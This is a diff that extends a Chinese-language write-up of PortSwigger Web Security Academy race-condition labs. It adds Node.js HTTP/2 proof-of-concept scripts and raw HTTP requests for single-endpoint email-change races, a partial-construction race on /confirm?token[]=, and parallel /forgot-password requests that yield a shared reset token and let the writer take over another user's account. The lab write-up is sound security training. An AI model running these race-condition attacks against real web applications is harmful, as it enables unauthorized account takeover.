@@ -226,11 +226,120 @@ function lab3() {
   });
   addToCartStream.end("productId=1&redir=PRODUCT&quantity=1");
 }
-
-lab3();
 ```
 
 一次成功，好虛幻，因為我沒有把 response body 印出來，所以只能回到 lab 看有沒有成功解題XD
+
+## Lab: Single-endpoint race conditions
+
+| Dimension | Description                                                                              |
+| --------- | ---------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/race-conditions#single-endpoint-race-conditions     |
+| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint |
+
+按照 [race-conditions-password-reset-collision](https://portswigger.net/web-security/race-conditions/images/race-conditions-password-reset-collision.png) 的做法
+
+PoC
+
+```ts
+function lab4() {
+  const csrf = "rdV8DUvAyBOEC5gnrE470rkROZjTRPD9";
+  const cookie = "session=R3bD21aRw8Dfd1iUqvAvxNczouBnwjYT";
+  const origin =
+    "https://0aab0039043c69e382b3a6e500af0096.web-security-academy.net";
+  const clientHttp2Session = http2.connect(origin);
+  const changeEmailStream1 = clientHttp2Session.request({
+    "content-type": "application/x-www-form-urlencoded",
+    ":path": "/my-account/change-email",
+    ":method": "POST",
+    cookie: cookie,
+  });
+  changeEmailStream1.end(
+    `email=helloworld%40exploit-0a42005e0414696f82d1a54001d4003c.exploit-server.net&csrf=${csrf}`,
+  );
+  const changeEmailStream2 = clientHttp2Session.request({
+    "content-type": "application/x-www-form-urlencoded",
+    ":path": "/my-account/change-email",
+    ":method": "POST",
+    cookie: cookie,
+  });
+  changeEmailStream2.end(`email=carlos%40ginandjuice.shop&csrf=${csrf}`);
+}
+```
+
+## Lab: Partial construction race conditions
+
+| Dimension | Description                                                                                   |
+| --------- | --------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/race-conditions#partial-construction-race-conditions     |
+| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction |
+
+這題的概念是，先發送一個註冊的請求
+
+```
+POST /register HTTP/2
+Host: 0ad600f403a44380bce3cf8a004d0013.web-security-academy.net
+Cookie: phpsessionid=lk3WAHziPRfMb4H5Rg1iSOZirRQWzBX1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+
+csrf=XuF72hUyhKsfvY73MDBEz8pIEC0ESvuf&username=user80&email=user80%40ginandjuice.shop&password=password
+```
+
+同時間發送
+
+```
+POST /confirm?token[]= HTTP/2
+Host: 0ad600f403a44380bce3cf8a004d0013.web-security-academy.net
+Cookie: phpsessionid=lk3WAHziPRfMb4H5Rg1iSOZirRQWzBX1
+Content-Length: 0
+
+
+```
+
+我嘗試用 NodeJS http2 模組來寫，都不成功，只好用官方解法
+
+推測是因為 NodeJS http2 提供的 API 沒辦法很精細的控制 TCP 封包的發送，畢竟 NodeJS 只有提供
+
+```ts
+const stream = clientHttp2Session.request();
+stream.end();
+```
+
+沒辦法控制 TCP Packet 的大小，所以這種情況還是建議用 Turbo Intruder 這種專門的工具QQ
+
+## Lab: Exploiting time-sensitive vulnerabilities
+
+| Dimension | Description                                                                                                        |
+| --------- | ------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/race-conditions#time-sensitive-attacks                                        |
+| Lab       | https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities |
+
+這題會使用到 [Session-based locking mechanisms](https://portswigger.net/web-security/race-conditions#session-based-locking-mechanisms) 的概念，需要用兩個不同的 `phpsessionid` 在同一時間發出 `/forgot-password` 的請求
+
+```ts
+function lab6() {
+  const origin =
+    "https://0a4400c003eddf588011a3b100a100ce.web-security-academy.net";
+  const clientHttp2Session = http2.connect(origin);
+  const stream1 = clientHttp2Session.request({
+    "content-type": "application/x-www-form-urlencoded",
+    cookie: "phpsessionid=XXz2mTTeYzwdmF5cyrJGrHDZqPGsAq0q",
+    ":method": "POST",
+    ":path": "/forgot-password",
+  });
+  const stream2 = clientHttp2Session.request({
+    "content-type": "application/x-www-form-urlencoded",
+    cookie: "phpsessionid=J8v2LeLg0CVHupVhkdHf0B3JTfNPFH9Z",
+    ":method": "POST",
+    ":path": "/forgot-password",
+  });
+  stream1.end(`csrf=rXZSrY5pjhXhGcBW8Mlq5qTsS6d8gcYF&username=wiener`);
+  stream2.end(`csrf=zliJ2MkhBQAjP100EcPQEP9l7IYRcpwK&username=carlos`);
+}
+```
+
+這樣就會生成同樣的 passwordResetToken，就可以修改受害者（carlos）的密碼了
 
 ## 參考資料
 
